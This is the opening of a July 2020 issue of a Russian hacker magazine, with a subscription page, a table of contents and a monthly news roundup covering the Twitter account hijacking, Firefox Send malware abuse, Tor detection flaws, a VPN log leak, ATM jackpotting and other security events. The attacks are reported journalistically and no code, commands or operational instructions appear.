
                              ПОДПИСКА НА «ХАКЕР»




Мы благодарим всех, кто поддерживает
редакцию и помогает нам компенсировать
авторам и редакторам их труд. Без вас
«Хакер» не мог бы существовать, и каждый
новый подписчик делает его чуть лучше.




                        Напоминаем, что дает годовая подписка:

                            год доступа ко всем материалам, уже
                        опубликованным на Xakep.ru;
                            год доступа к новым статьям, которые
                         выходят по будням;
                         полное отсутствие рекламы на сайте
                           (при условии, что ты залогинишься);
                         возможность скачивать выходящие
                       каждый месяц номера в PDF, чтобы
                           читать на любом удобном устройстве;
                       личную скидку 20%, которую
                      можно использовать для продления
                          годовой подписки. Скидка накапливается
                               с каждым продлением.

                         Если по каким-то причинам у тебя еще нет
                           подписки или она скоро кончится,
                              спеши исправить это!
                                               Июль 2020
            № 256
CONTENTS

    MEGANews
  Всё новое за последний месяц

     Android
  Новые запреты и чистый код на Kotlin

    Хроника атаки на Twitter
  Как поймали хакеров, взло мавших социальную сеть

    Ликвидация EncroChat
  Как накрыли платформу для зашиф рован ных коммуника ций

    Боевой Linux
  Обзор самых мощ ных дис трибутивов для пентестов и OSINT

    Малварь на просвет
  Учим ся быстро искать признаки вредонос ного кода

    «Я не специально»
  Ка кие отмазки хакеров могут сра ботать в суде

    Атака на облака
  Гайд по методам взло ма приложений в Azure и AWS

    Вкуриваем QR
  Как сделать QR-код с сюр призом

    Фундаментальные основы хакерства
  Учим ся иден тифицировать конструкторы и деструкторы

    Синтетический закат
  Про ходим вир туалку Sunset decoy, что бы отто чить навыки пен теста

   Дыры в дыре
  Как работа ют уязвимости в Pi-hole, которые позволя ют захватить Raspberry Pi

    Как прокачать мышь
  Ставим суперконден сатор в бес про вод ную мышь, что бы заряжать ее за секунды

    Только самое нужное
  Избавля ем Linux от багажа про шивок для обо рудования

    Фиктивный адрес
  Как под менить геоло кацию на Android, чтобы обма нывать приложения

    Погружение в ассемблер
  Осваиваем арифметические инструкции

    Нескучный Data Science
  Пишем на языке R собствен ный детектор спа ма

    Технология обмана
  Что такое Deception и как теперь обма ныва ют хакеров

    Хитрости BIND
  Берем кон троль над DNS в свои руки

    Не пустой звук
  Разбира емся, как устроено циф ровое кодиро вание звука

    Титры
  Кто дела ет этот журнал
                                       Мария «Mifrill» Нефёдова
                                                    nefedova@glc.ru





ВЗЛОМ TWITTER
В июле 2020 года компания Twitter стол кну лась с самой масштабной атакой
за все время своего существования. Компромета ции подверглось множество
аккаунтов публичных людей, компаний, криптовалютных бирж. Так, среди пос‐
традавших были: Билл Гейтс, Илон Маск, Джефф Безос, Джо Байден, Барак
Обама, Уоррен Баффет, Канье Уэст, Ким Кардашь ян, компании Apple и Uber,
крупнейшие криптовалют ные биржи CoinDesk, Binance и Gemini.





Полученным доступом  к топовым  аккаунтам  злоумышленники восполь‐
зовались, устроив фальшивую раз дачу биткойнов. Мошенники действовали
по классической скамерской схеме: от лица извес тных людей и крупных ком‐
паний они просили прис лать им небольшое количес тво криптовалюты, обе‐
щая удвоить и вернуть любую полученную сумму.
   Как ни парадоксально, но даже в 2020 году нашлось немало людей,
которые поверили, что Билл Гейтс, Илон Маск и другие известные компании
и личности вдруг начали раз давать биткойны. В итоге таким образом мошен‐
ники «заработали» примерно 13 BTC, то есть около 120 тысяч долларов.
  Причем жертв могло быть и больше, если бы крупные криптовалютные
биржи своевременно не заблокиро вали злоумышленников. К примеру, биржа
Coinbase помешала 1100 своим клиентам перевес ти 30,4 BTC — око‐
ло 280 тысяч долларов по текущему курсу. Лишь 14 пользовате лей Coinbase
успели отправить биткойны на адрес мошенников (на общую сумму око‐
ло 3000 долларов), прежде чем специалисты внесли его в черный список.
    Twitter сообщает, что, согласно предварительным результатам рассле‐
дования, атака затронула сравнительно неболь шое количество учтенных
записей. Взлом коснулся лишь 130 акка унтов, и для 45 из них были успешно
сброшены пароли — от лица этих учетных записей взломщики размещали
мошеннические сооб щения.
  Еще для семи учетных записей злоумышленники скачали все дос тупное
содержимое аккаунта, вос пользовавшись функци ей Your Twitter Data. Инте‐
ресно, что ни один из этих семи аккаунтов не был верифицирован (не имел
синей галочки). Также зло умышленни ки отдельно просматривали личные
сообщения владельцев 36 скомпрометированных учетных записей. Причем
один из этих аккаунтов принадлежал неназванному нидерландскому полити‐
ку.
  В конце июля стало извес тно, что ата ка на социальную сеть была резуль‐
татом  компрометации  сра зу  нескольких  сотрудников  компании.  Так,
15 июля 2020 года мошенники устроили фишинговую атаку по телефону
и применили социальную инженерию к сот рудникам Twitter. Когда учетные
данные, похищенные  у одно го из работников компании, не позволили
хакерам подобраться к внутренним инстру ментам Twitter, злоумышленники
атаковали других  сот рудников,  у  которых был дос туп  к инструментам
для управле ния учетными записями пользователей.



      «Не все ата кованные сотрудники име ли пра ва для использования инс-
      тру ментов  управле ния  учетными  записями,  но  злоумыш ленники
      использовали их учетные данные для дос тупа к нашим внутренним
      сис темам и получе ния информа ции о наших процес сах. Эта информа-
      ция поз волила им ата ковать дру гих сотрудников, которые обла дали
      дос тупом к инс тру ментам под дер жки», — объяснили пред ста вите ли
      ком пании.

После инцидента на время рас следования Twitter серьезно ограничила дос‐
туп своих сотрудников к внутренним инстру ментам и системам. Эти ограниче‐
ния в первую очередь каса ются функции Your Twitter Data, которая позволяет
пользователям загружать все свои данные из Twitter, но также ограничения
распространяются и на дру гие сервисы.
  Невзирая на все оправдания Twitter, американский сенатор Рон Уайден
и активисты Electronic Frontier Foundation подняли вопрос, почему социальная
сеть до сих пор не реализовала сквоз ное шифрование для личных сооб‐
щений, хотя еще в 2018 году работа ла над этой функциональностью.



        «Twitter сейчас не приш лось бы бес покоиться о том, что злоумыш-
      ленники могли прочитать, похитить или изме нить лич ные сообщения,
      если бы ком пания внед рила E2E для лич ных сообщений, как EFF про-
      сил годами», — пишет активис тка Ева Гальперин из Electronic Frontier
       Foundation.

31 июля 2020 года американские влас ти объявили, что стоявшие за масштаб‐
ным взломом злоумыш ленники пойманы. В США и Великобритании были
арестованы трое подоз реваемых, а главным «идейным вдохновителем» этой
операции назван 17‐летний подросток из Флориды Грэм Айвен Кларк (также
известный как Kirk). Его сообщники — 19‐летний Мейсон Шеппард («Chae‐
won») из Великоб ритании и 22‐летний Нима Фазели («Rolex») из Флориды.
  Известно, что Грэму Айвену Кларку предъявлены обви нения по 30 пунктам
и, невзирая на возраст, судить его будут как взрос лого.


100 000 ДОЛЛАРОВ ЗА ИСХОДНИКИ CERBERUS
В даркнете на продажу выставлены исходные коды банковско го Android‐тро яна Cerberus.

Цена начинается от 50 000 долларов США, и авторы мал вари намерены провести аукцион
с шагом в размере 1000 долларов (впрочем, за 100 000 дол ларов вредонос можно при‐
обрести сразу и без тор га). В эту цену входит все сразу: от исходного кода до списка клиентов,
инструкции по установке и скрип ты для совместной работы компонен тов. То есть покупатель
получит исходный код вредоносного APK, модуль, а также все «ключи» от панели администра‐
тора и серверов.


Продавец пишет, что причина продажи исходников прос та: яко бы хак‐группа, создавшая Cer‐
berus, распалась, и больше некому заниматься круг лосуточной поддержкой тро яна.





FIREFOX SEND
НЕ РАБОТАЕТ
Журналисты издания ZDNet привлекли вни мание инже неров Mozilla к мно‐
гочисленным злоупотреблениям сервисом  Firefox Send, который активно
использовался для распростра нения малвари. Сейчас работа сервиса при‐
остановлена на время расследования, а разработ чики обещают улучшить его
и добавить кнопку «Сооб щить о нарушении».
   Firefox Send был запущен в марте 2019 года. Сервис представляет собой
приватный файловый хостинг и позволяет пользователям Firefox обме нивать‐
ся файлами. Все файлы, заг руженные и переданные через Firefox Send, хра‐
нятся в зашифрованном виде, и пользователи могут сами установить срок
хранения файлов на сервере, а также задать допустимое количество загрузок
до истечения этого «срока годности». Сервис был доступен всем пользовате‐
лям по адресу send.ﬁrefox.com.
   Хотя инженеры Mozilla планировали Firefox Send, думая о конфиденциаль‐
ности и безопасности сво их пользователей, начиная с конца 2019 года сер‐
вис стал весьма популярен не у простых людей, а у разработчиков малвари.
  В большинстве случаев хакеры экс плуатируют сервис очень прос тым спо‐
собом: загружают полез ные нагрузки малвари в Firefox Send, где файл сох‐
раняется в зашифрованном виде, а затем вставляют ссылки на этот файл,
к примеру, в свои фишинговые письма.
   ZDNet пишет, что в последние несколько месяцев Firefox Send исполь‐
зовал ся для хранения пейлоадов самых разных кампаний — от вымогателей
до финансово ориенти рованной малвари и от банковских троянов до спай‐
вари,  атаковав шей  правоза щитников. Сервисом  злоупотребляли  такие
известные хак‐группы, как FIN7, REVil (Sodinokibi), Ursnif (Dreambot) и Zloader.
  Британский ИБ‐эксперт Колин Харди пояс нил, какие именно факторы
привлекают авторов вредоносных программ в сервисе Firefox Send. Так, URL‐
адреса  Firefox считаются надежными во мно гих организациях, то есть
спам‐фильтры не обнаруживают и не блокируют их. К тому же злоумышленни‐
кам не приходится вкла дывать время и день ги в создание и поддержание
собственной инфраструктуры, если они используют серверы Mozilla.
   И, как уже было упомянуто, Firefox Send шифрует файлы, что препятс твует
работе защитных решений, а ссылки на скачива ние мал вари могут быть нас‐
троены таким образом, чтобы срок их действия истекал через определенное
время или количество скачиваний. Это тоже зат рудняет работу ИБ‐экспертов.
   Растущее количество вредоносных операций, связанных с Firefox Send,
не ускользнуло и от внимания ИБ‐сообщес тва. Из‐за этого в течение нес‐
кольких последних месяцев эксперты регулярно сетовали, что у сервиса нет
механизма сообщения о  зло употреблениях или  кнопки «Пожаловаться
на файл», которые могли бы помочь пресечь вредонос ные операции.
   Готовя публикацию об этих проблемах, журналисты ZDNet обратились
к Mozilla за ком ментарием, желая узнать, что организация думает о раз‐
мещении вредоносного ПО, а также каков ста тус разработки механиз ма
для уведомления о нарушениях.
  Ответ Mozilla удивил и журналистов, и ИБ‐специалистов: организация
немедленно приостановила работу сервиса Firefox Send и сообщила, что
работает над его улучшением.



     «Мы вре менно переве дем Firefox Send в автоном ный режим, пока
      будем улуч шать продукт. Перед пов торным запус ком [сер виса] мы
      добавим механизм подачи отче тов о наруше ниях, чтобы дополнить
     фор му обратной связи, а так же будем тре бовать от всех пользовате-
       лей, жела ющих поделиться контентом с помощью Firefox Send, войти
      в сис тему с помощью учетной записи Firefox», — заявили предста вите-
      ли Mozilla.

В настоящее время сроки возвращения Firefox Send в онлайн неиз вестны.
Все ссылки на Firefox Send перес тали работать, а значит, все вредоносные
кампании, использовавшие сервис, тоже временно выведены из строя.


ДУРОВ ОПЯТЬ КРИТИКУЕТ APPLE И GOOGLE
Павел Дуров выступил с критикой в адрес компаний Apple и Google, так как, по его мне нию,
они злоупотребляют своим положением на рынке. Он пишет, что IT‐гиган ты уве личивают
на 30% цену мобильных приложений для всех пользователей смартфо нов в мире и тем самым
попросту уничтожают стартапы.
   Он делает вывод, что в настоящее время практичес ки все разработчики, которые продают
пользователям смартфонов премиальные и цифровые услуги, ско рее работают на Apple
и Google, чем на самих себя.





→«Apple, пользуясь монопольным положением, требует от всех раз работчиков приложе ний
в App Store перечислять ей 30% от оборота с продажи любых цифровых услуг. Цифровые услу‐
ги — это, например, пла та за сами приложения или премиальные возможности в них. Взамен
Apple не дает разработчикам ничего, кроме разрешения их приложениям быть доступными
для пользователей iPhone.
   Разработчики приложений тратят значительные ресурсы на создание, поддержание и прод‐
вижение своих проектов. Они жестко кон курируют между собой и несут огромные риски. Apple
же не вкладывает в создание сторонних приложений на своей платформе практически никаких
средств и не рискует ничем, зато гарантирован но получает 30% от их оборота. Почти так же
печально обстоят дела у разработчиков на смар тфонах Android от Google.
   У создателей при ложений остается лишь две трети заработанных ими средств для выплаты
зарплат, оплаты хостинга, маркетин га, лицензий, государственных налогов. Часто этого ока‐
зывается недостаточно, чтобы покрыть все расходы, а дальнейшее повышение цены для поль‐
зователей невозможно из‐за снижения спроса. Те проекты, которым удается оставаться при‐
быльными, несмотря на 30%‐й сбор, почти всегда приносят мень ше чис того дохода собс твен‐
ным создателям, чем дуополии Apple и Google»
— Павел Дуров в своем Telegram‐канале





НУЛЕВЫЕ ДНИ В TOR
Специалист по информа ционной безопас ности Нил Кравец, который сам
управляет несколькими узлами Tor, обнародовал детали двух уязвимостей
нулевого дня, затрагивающих саму сеть Tor и Tor Browser.
  Иссле дователь говорит, что раз работчики Tor уже не раз отказывались
исправлять найденные им проблемы, поэтому он решил пре дать уязвимости
огласке. Хуже того, Кра вец обещает обнародовать информацию еще о
трех 0‐day‐багах в бли жайшее время, и один из них может использоваться
для раскрытия реальных IP‐адресов серверов Tor.
  Первую   0‐day‐проб лему   специалист   описал   в   своем   бло‐
ге 23 июля 2020  года. В  этой  статье он  рассказал,  что компании
и интернет‐провайдеры  могут блокировать подключение пользователей
к сети Tor. Для это го требуется лишь сканировать сетевые подключения
на предмет характерной сигнатуры пакетов, уникаль ной для Tor‐трафика.
   Вторую 0‐day‐уязвимость Кравец описал 30 июля 2020 года. Второй баг
также позволяет сетевым операторам выявлять трафик Tor. Но если первую
проблему можно использовать для обнаружения прямых подключений к сети
Tor (к нодам Tor guard), то вторая уязвимость дает воз можность обнаружить
опосредованные подклю чения. Речь идет о соединениях, которые поль‐
зователи устанавливают с мостами Tor.
  Напомню, что мосты работают как своего рода прокси, передавая соеди‐
нение от пользователя к самой сети Tor. Так как они крайне чувс твительная
часть инфраструктуры Tor, список мос тов пос тоянно обновляется, чтобы про‐
вайдерам было сложнее их заблокировать. А Кра вец пишет, что соединения
с мостами Tor можно легко обнаружить, исполь зуя технику отслеживания
определенных пакетов TCP.



      «Пос ле моей пре дыду щей и этой записи в блоге у вас есть все, что
      нужно для усиления политики [блокирования Tor] с помощью сис темы
      провер ки пакетов в режиме реального вре мени. Вы можете зап ретить
      всем своим пользовате лям под клю чаться к Tor, независимо от того,
      под клю чены они нап рямую или используют мост», — пишет эксперт.

Также специалист рассказывает, что, по его мнению, инженеры Tor Project
недостаточно серьезно отно сят ся к безопасности своих сетей, инструментов
и пользователей. Он ссылается на свой предыдущий опыт и многочисленные
попытки сообщить разработчикам Tor о раз личных ошибках, которые в итоге
так и не были исправлены. В их числе:
 • уязвимость, позволя ющая сайтам обнаруживать и распознавать поль‐
   зователей браузера Tor по ширине полосы прокрутки (известна разработ‐
   чикам с июня 2017 года);
 • уязвимость, позволяющая обна руживать мосты  Tor, используя их порт
   Onion routing (обнаружена восемь лет назад);
 • уязвимость, позволя ющая идентифицировать биб лиотеку SSL, исполь‐
   зуемую серверами Tor (найдена 27 декаб ря 2017 года).

В начале июля 2020 года Кравец сообщил, что решил окончательно отказать‐
ся от сотрудничества с Tor Project и теперь намерен рас сказывать о проб‐
лемах во всеуслышание.


САМАЯ АКТИВНАЯ МАЛВАРЬ ПОЛУГОДИЯ
Эксперты ком пании Check Point подвели итоги первых шес ти месяцев 2020 года и представили
отчет о самых активных киберугрозах. Исследователи рассказывают, что мошенники широко
использовали пандемию и связанные с ней темы для развертывания атак, а также отмечают
активность недавно вернувшегося к жизни ботнета Emotet.

В среднем на одну ком панию в Рос сии приходилось 570 атак в неделю, причем среднее
по миру число атак на одну организацию составило 474.





    Динамика изменения среднего числа атак на орга низа ции в неделю в России и в мире за первое
                                       полугодие 2020 года


Список наиболее активных угроз в Рос сии выглядит следующим образом: модульный вре донос
Emotet (6%), набор эксплоитов Rig (5%), майнер XMRig (5%), RAT Agent Tesla (3%), Phor-
piex (3%).





                  Среднее число атак на организа ции в неделю по типам угроз





      Наиболее распространенные уязвимости организаций за первые шесть месяцев 2020 года





                                     Продолжение статьи →
← Начало статьи





 СПЕЦИАЛЬНЫЕ
 IPHONE
  В этом месяце компания Apple наконец объявила об официальном запуске
  программы Security Research Device (SRD), которую анонсировали еще в
  прошлом году. В рамках этой инициативы избранным исследователям пре‐
  доставят специальные версии iPhone.
     У таких устройств отключено большинс тво функций безопас ности, и сами
  инженеры Apple исполь зуют такие девайсы для поиска проблем (еще
  до окончательного одобрения прототипов и отправки устрой ств в массовое
  производство). Устройства будут иметь мень ше ограниче ний, обеспечат
  более глубокий доступ к операционной системе и железу и позволят спе‐
  циалистам обнаружить проб лемы, которые нельзя выявить на обычных
   iPhone. Раньше такие девайсы нередко попадали на черный рынок, где про‐
  давались за немалые день ги, а порой оказыва лись в руках брокеров уяз‐
  вимостей или продавцов 0‐day.
     Для участия в SRD исследователям предлагается подать заявку, причем
  для этого необязательно иметь профильное образование и кучу дипломов.
  Достаточно обладать подтвержденным опытом в сфе ре ИБ‐иссле дований,
  причем не только iPhone, но и дру гих устройств и ПО, включая Android, Win‐
  dows и Linux.
    Однако многих ИБ‐экспертов смутили официаль ные правила программы.
  Если в прошлом году ИБ‐сообщес тво лишь поприветствовало решение Apple
  расширить программу bug bounty и рас простра нить сре ди исследователей
  специальные версии  iPhone,  теперь специалисты  критикуют компанию
  и пишут, что не станут участвовать в подоб ном.
    Основная проб лема заключается в пункте пра вил SRD, который гласит:



         «Если вы уве дом ляете об уяз вимос ти, затрагива ющей продук ты Apple,
         Apple сообщит вам дату публикации (как пра вило, это дата, когда
         Apple выпус тит обновле ние для устра нения проблемы). <…> До [ого-
        воренной] даты публикации вы не сможете обсуждать уяз вимость
         с дру гими».

  В сущности, этот пункт предос тавляет компании Apple полный контроль
  над раскрытием уязвимостей. Именно про изво дитель будет устанавливать
   дату публикации, после которой исследова телям разрешат рас сказывать
  что‐либо о найден ных в рамках SRD уязвимос тях в iOS и iPhone. Многие спе‐
  циалисты опасаются, что Apple будет зло употреблять этим правом и задер‐
  живать важные обновления безопас ности, откладывая дату публикации и не
  позволяя специалистам предать проб лемы огласке.
    Одним из первых на эту особен ность пра вил обратил вни мание руково‐
  дитель группы Google Project Zero Бен Хокерс (Ben Hawkers). Он пишет
   в Twitter:



         «Похоже, что мы не сможем использовать Apple Security Research De-
           vice из‑за огра ниче ний на рас кры тие уяз вимос тей, которые, кажется,
         спе циально пред назна чены для исклю чения [из программы] Project
         Zero  и  дру гих  иссле дова телей,  которые  придер жива ются  пра-
         вила 90 дней».

  Сообщение  Хокерса  привлекло  внимание  других  ИБ‐исследователей,
  которые поддержали решение Google Project Zero. О своем нежелании учас‐
   твовать в программе на таких усло виях уже заявили глава компании Guardian
  Уилл Страфач (Will Strafach), специалис ты компании ZecOps, а также извес‐
  тный исследователь Axi0mX (автор эксплоита Checkm8) .



        «Сроки рас кры тия информа ции [об уяз вимос тях] — стандар тная прак-
         тика в отрасли. Они необходимы. Но Apple тре бует от иссле дова телей
        подождать неограниченное количес тво вре мени, на усмотре ние самой
          Apple, прежде чем они смогут рас крыть информа цию об ошибках,
        обна руженных  в рам ках  Security Research  Device  Program. Сроки
        не уста нов лены. Это ядовитая пилюля», — пишет Axi0mX.

  Бывший глава по информа ционной безопасности в Facebook Алекс Стамос
   также раскритиковал действия Apple. Он пишет, что если Apple удас тся нас‐
   тоять на своем, навязать свои усло вия исследователям (а также выиграть
  судебный процесс против сервиса вир туализации iOS), то «можно поп‐
  рощаться  с  результативными  публичны ми  исследованиями  в  области
  безопасности в США».
     Издание ZDNet отмечает, что bug bounty программу Apple критиковали
  и ранее. К примеру, в апреле текущего года macOS‐ и iOS‐разработчик
  Джефф Джонсон (Jeﬀ Johnson) опубликовал серию сообщений в Twitter, где
  писал следующее:



        «Я думаю о выходе из программы Apple Security Bounty. Не вижу
         никаких доказа тельств того, что Apple серьезно относится к этой прог-
        рамме. Я слы шал о вып лате лишь одного воз награждения, и та уяз-
         вимость даже не была спе цифич на именно для Mac. Кроме того,
         в Apple Product Security нес колько недель игнорировали мое пос-
        леднее письмо.
            Apple объявила об этой программе в августе [прош лого года],
        не запус кала ее до Рождес тва, а теперь, нас колько мне извес тно,
        до сих пор не зап латила ни одному иссле дова телю безопас ности Mac.
        Это смеш но. Думаю, их цель зак люча ется в том, чтобы зас тавить
         иссле дова телей молчать об ошибках как можно дольше».


  200 000 СОТРУДНИКОВ GOOGLE ПРОДОЛЖАТ РАБОТАТЬ
 ИЗ ДОМА
  В конце июля стало известно, что глава Google Сундар Пичаи принял решение оставить на уда‐
   ленке почти все рабочую силу ком пании: около 200 000 сотрудников и подрядчиков. Из‐за
   пандемии коронавируса все эти люди продол жат работать на дому как минимум до середи-
  ны 2021 года, хотя изначаль но ком пания планировала вновь открыть офисы в янва‐
   ре 2021 года.


   На похожие меры пошло руководство Facebook и Amazon, чьи сотрудники будут работать
   из дома как минимум до конца текущего года. Спе циалисты Twitter и вовсе перешли на удален‐
   ку на неопределенный срок, а работники Microsoft останутся дома как минимум до октября.





 ЛОГИ, КОТОРЫХ НЕТ
  Большинство провайдеров услуг VPN утвержда ют, что они не сле дят за сво‐
  ими пользовате лями и не ведут никаких логов. К сожалению, это далеко
  не всегда правда. Так, недавно специалист компании Comparitech Боб
  Дьяченко (Bob Diachenko) обнаружил утечку поль зовательских данных, соб‐
  ранных VPN‐провайдером, который якобы не вел логов.
     Все началось с того, что Дьяченко заметил в сети незащищенный клас тер
   Elasticsearch, где хранились 894 Гбайт данных, принадлежащих провайдеру
  UFO VPN. Как оказалось, в логах старательно фиксировались: пароли от учет‐
  ных записей (открытым текстом), секреты и токены VPN‐сес сий, IP‐адреса
  пользовательских устройств и серверов VPN, к которым они под ключались,
  временные мет ки подклю чений, информация о местоположении, данные
  о самих устройствах и версиях ОС, а также веб‐домены, с которых в браузеры
  пользователей бесплатной версии UFO VPN внедрялась реклама. При этом
  политика конфиденциальнос ти UFO VPN гласит, что сервис не отслеживает
  действия пользователей за пределами сайта компании и не собирает никаких
  данных.
    По данным  Comparitech,  в  логи UFO VPN ежедневно добавляется
  более   20   миллионов   новых   записей.   Дьяченко   пишет,   что
  еще 1 июля 2020 года он предупредил про вай дера об утечке данных, но так
  и не дождался ответа. Лишь спустя нес колько недель база все же пропала
  из онлайна и перестала обнаруживаться Shodan, но лишь после того, как спе‐
  циалист связался с хостером UFO VPN.
     Также данную утечку обнаружили и специалисты VPNmentor. Они сооб‐
  щили, что проблема каса ется не только UFO VPN и его пользователей, но и
  еще шести VPN‐провайдеров из Гонконга: FAST VPN, Free VPN, Super VPN,
   Flash VPN, Secure VPN и Rabbit VPN. Судя по всему, все эти наз вания ведут
   к одной организации, которая предоставляет своеобразную white‐label‐базу
  для VPN‐сервисов. И конечно, все эти провайдеры заявляют, что не ведут
   никаких логов.
     Все перечисленные провайдеры работали с тем же незащищенным клас‐
  тером Elasticsearch. В общей сложности исследова тели обнаружили в откры‐
  том доступе около 1,2 Тбайт данных: 1 083 997 361 лог, многие из которых
  содержат конфиденциальную информа цию.
      Так, в логах можно было найти информа цию о посещенных веб‐сайтах,
  журналы подключений, имена людей, адреса электронной почты и домашние
  адреса пользователей, пароли открытым текстом, информацию о платежах
   в биткойнах и PayPal, сооб щения в службу поддержки, спецификации поль‐
  зовательских устрой ств и информацию об учетных записях.





                           PayPal‐платеж пользователя из США



        «Каждый из этих VPN-провайдеров утвер жда ет, что их сер вис не ведет
          логов, то есть не регис трирует какую‑либо активность пользовате лей
         в соответс тву ющих приложе ниях. Одна ко мы обна ружили нес колько
        экзем пляров логов интернет‑активнос ти на их общем сер вере. И это
         в дополнение к лич ной информа ции, которая вклю чала в себя адре са
         элек тронной поч ты, пароли в откры том виде, IP-адре са, домаш ние
        адре са, модели телефонов, идентифика торы устройств и дру гие тех-
         ничес кие детали», — пишут спе циалис ты VPNmentor.

  Исследователи VPNmentor даже провели эксперимент и соз дали учетную
  запись у одного из про вайдеров, пос ле чего нашли ее в логах, а также
  информацию об адресе электронной почты, мес тоположении, IP‐адре се,
  устройстве и серверах, к которым они подключились.
    Специалисты уведомили провайдеров о проб леме и необ ходимости уда‐
   лить кластер из открытого дос тупа и даже сообщили об инциденте HK‐CERT,
  но никаких немедленных действий не последова ло.
    Лишь несколько недель спус тя представители UFO VPN все же выпустили
  официальное заявление и сообщили, что из‐за пандемии коронавируса они
  не смогли должным обра зом защитить пользовательские данные и не
  заметили вов ремя, что в конфигура ции брандмауэра была допущена ошибка.
     Также провайдер уверяет, что обнаруженные экспертами логи были ано‐
  нимными и сохранялись исклю читель но с целью мониторинга пропускной
  способности, хотя некоторые записи мог ли содержать IP‐адреса, а также
  токены и секреты учетных записей. Провайдер настаивает, что в логах
  не было паролей в формате открытого текста, а эксперты приняли за пароли
   что‐то иное, к примеру токены сеансов. Что каса ется email‐адресов, пред ста‐
   вители UFO VPN объясня ют, что иногда пользователи присылают отзы вы,
  содержащие адреса электронной почты, хотя таких насчитывается меньше
  одного процента.
     Эксперты Comparitech и VPNmentor в корне несогласны с позицией про‐
  вайдера и пишут, что обнаруженные ими данные точно не были анонимными
  и обезличенными. Они рекомендуют всем пользователям сме нить пароли.


  ТОРВАЛЬДС ПИШЕТ КОД В ПОЧТОВОМ КЛИЕНТЕ
   Недавно на YouTube‐канале Linux Foundation появилась запись с мероприятия Open Source
   Summit and Embedded Linux Conference: Europe. В ролик вошла беседа Линуса Торвальдса
   с Дирком Хонделом, вице‐президен том VMware. Во время беседы Торвальдс сообщил, что он
   уже не пишет код в привычном понимании, и немного рас сказал о своем рабочем процес се.





  →«Я читаю электронные письма, пишу электронные письма. Я больше не занимаюсь написа‐
   нием кода. Большинство кода я пишу прямо внутри своего почтового клиента. Нап ример,
   кто‐нибудь при сылает мне патч или pull request или идет дискуссия о каком‐то сле дующем pull
   reques’е. Я отвечаю „Да, это отлично, но“ и в ответ отправляю псевдокод. <…>
     Я так привык править и отправлять патчи, что могу писать их непос редственно в почтовом
   клиенте. Я больше не программист. Я читаю куда больше писем, чем пишу. Поэто му в ито ге
   моя работа теперь заключается в том, чтобы говорить нет»
  — признается Линус Торвальдс





 НОВЫЕ АТАКИ
 НА БАНКОМАТЫ
  Специалисты компании Diebold Nixdorf предупредили о новой вари ации black
  box атак на банкоматы, которую начали применять злоумышленники в Бель‐
   гии.
      Black box атаки представляют собой разновидность джекпоттинговых
   (jackpotting) атак, во время которых киберпреступники заставля ют банкомат
  выдавать деньги. Такая атака может быть выполнена с помощью вредонос‐
  ного ПО, установленного в банкомате, или с помощью «черного ящика». Этим
  термином обычно обознача ют ноутбук или устройство на базе одноплатного
  микрокомпьютера, которое используется, чтобы подключиться к внутренним
  компонентам банкомата (для доступа к портам, проводке и прочему прес‐
   тупники обычно разбира ют корпус или вырезают в нем отверстие). Подклю‐
  чившись к машине, злоумышленники попросту отдают банкомату команду
  на «высвобождение» наличных из кас сет, в которых те хранятся.
      Diebold Nixdorf сообщает, что пока новые ата ки применяются только про‐
   тив банкоматов модели ProCash 2050xe, к которым злоумышленники подклю‐
  чаются через порты USB. Компания объясняет:



        «Во вре мя недав них инцидентов злоумыш ленники сос редоточили свои
         усилия на улич ных сис темах. Они раз руша ют час ти лицевой панели,
         чтобы получить физичес кий дос туп к глав ному отде лению. Затем они
         отсоединяют USB-кабель, соединяющий дис пенсер CMD-V4 и спе-
         циальную элек тронику, или кабель межу спе циальной элек троникой
        и компьюте ром банкомата. Этот кабель под клю чается к „чер ному ящи-
          ку“ злоумыш ленников для отправ ки команд на выдачу налич ных».

  Однако не это само по себе привлекло внимание специалистов. Дело в том,
   что обычно для взаимодействия с компонентами банкомата злоумышленни ки
  используют малварь или собственный код, но теперь хакеры, похоже, заполу‐
  чили копию легитимного ПО (про шивки) банкоматов, которое установили
  на свой «черный ящик» и использовали для вза имодействия с машинами.
    Пока расследование инцидентов еще продолжается, но в Diebold Nixdorf
  считают, что хакеры могли подключиться к какому‐то банкомату и обнаружить,
   что его ПО хранилось на незашифрованном жестком диске.
     Издание ZDNet ссылается на собственные источники в банковской сфере
  и сообщает, что предупреждение, опубликованное производителем, нап‐
  рямую связано с расследованием ряда джекпоттинговых атак, произошедших
   в Бельгии в июне — июле 2020 года. Эти атаки (два случая странного джек‐
   поттинга) вынудили бельгийский банк Argenta приоста новить работу 143 бан‐
   коматов. Причем местные СМИ писали, что были атакованы исключительно
  устройства Diebold Nixdorf.
    Специалист по банковскому фроду из компании Telefonica Мануэль Пинтаг
   (Manuel Pintag) сооб щил журналистам, что такой метод взлома банкоматов
   в целом не уникален, хотя рань ше он встречался не в странах Европы, а в
  Латинской Аме рике.


  1 400 000 ДОЛЛАРОВ СОБРАЛ НА KICKSTARTER
  FLIPPER ZERO

  В конце июля на Kickstarter стартовала кампания по сбору средств для «хакерско го тамагочи»
    Flipper Zero. Для запуска производс тва устройств требовалось собрать 60 000 долларов, и те,
   кто прочил проекту неудачу, явно оказались неправы. Искомая сумма была соб рана за счи‐
   таные минуты после старта кампании, а устройства за 99 дол ларов разобрали момен тально.

  В настоящий момент проект уже привлек больше 1 400 000 долларов. Согласно «дорожной
   карте» кампании, это означает, что устройства будут дос тупны в новом цвете и оснащены Blue‐
   tooth и NFC. Первые поставки устройств ожидаются в фев рале 2021 года.





 40 ГБАЙТ ХАКЕРСКИХ
 ВИДЕО
  Одна из наиболее известных группировок иранских «правительственных»
  хакеров — APT35 (она же Charming Kitten, Phosphorous и NewsBeef) допус‐
   тила серьезную ошибку, неправиль но настроив один из своих серверов.
  Из‐за этого сервер три дня был дос тупен любому желающе му, и сотрудники
  IBM X‐Force обнаружили на нем около 40 Гбайт видео и дру гих файлов, про‐
  ливающих свет на «работу» группы.





           На сер вере хак‐группы хранились и похищенные у целей данные

  Исследователи считают, что некоторые из най денных ими видео представ‐
  ляют собой учебные пособия, которые группировка использует для обу чения
  новичков. Так, записи были сделаны с помощью спе циального при ложе ния
  BandiCam, то есть эти видео появились не случайно, и хакеры не заразились
  своим собственным вредоносным ПО (да, история знавала и такие случаи).





               BandiCam и рабочий стол одно го из авторов хак‐видео

  Ролики демонстрируют, как иранские хакеры выполняют самые разные
   задачи, вклю чая пошаговый взлом  акка унта жертвы с использованием
  заранее подготовленного списка учетных данных. Основны ми целями взлом‐
  щиков выступали чужие почтовые ящики, но также взламывали и учетные
  записи в социальных сетях, если были дос тупны скомпрометированные учет‐
  ные данные.
